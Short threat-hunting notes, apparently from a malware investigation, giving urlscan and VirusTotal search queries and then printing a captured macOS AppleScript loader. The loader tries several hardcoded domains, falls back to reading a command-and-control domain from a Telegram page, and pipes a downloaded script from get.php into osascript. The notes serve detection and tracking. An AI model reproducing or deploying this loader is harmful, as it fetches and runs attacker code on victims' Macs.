https://urlscan.io/search/#page.url.keyword%3A*%5C%2F%5Cscript%5C.sh
VirusTotal:
entity:url "/?ublib="
entity:url exact_path:/script.sh

URL scan shows 2 months ago as start, older script:

```
property domainsList : {"x2db.cx", "a5db.ch", "a6b6.biz"}
property activeDomain: ""
property btxid: "1897221dce2c5de51f940f046970b976"

on setDomain()
    repeat with d in domainsList
        set domain to (contents of d)
        set urlresult to "http://" & domain & "/api.php?check"
        set actualurl to "http://" & domain & "/"
        try
            set response to do shell script "/usr/bin/curl -s --connect-timeout 5 --max-time 10 " & quoted form of urlresult
            if response is "success" then
                set activeDomain to actualurl
                return true
            end if
        end try
    end repeat
    try
        set domain to do shell script "curl -s --connect-timeout 5 --max-time 10 https://t.me/neverfakebot | sed -n 's/.*<span dir=\"auto\">\\([^<]*\\)<\\/span>.*/\\1/p'"
        set urlresult to "http://" & domain & "/api.php?check"
        set actualurl to "http://" & domain & "/"
        set response to do shell script "curl -s --connect-timeout 5 --max-time 10 " & quoted form of urlresult
        if response is "success" then
            set activeDomain to actualurl
            return true
        end if
    end try
    return false
end setDomain

if setDomain() then
    set startsrc to "curl -s " & quoted form of (activeDomain & "get.php?txid=" & btxid) & " | osascript"
    do shell script startsrc
end if
```
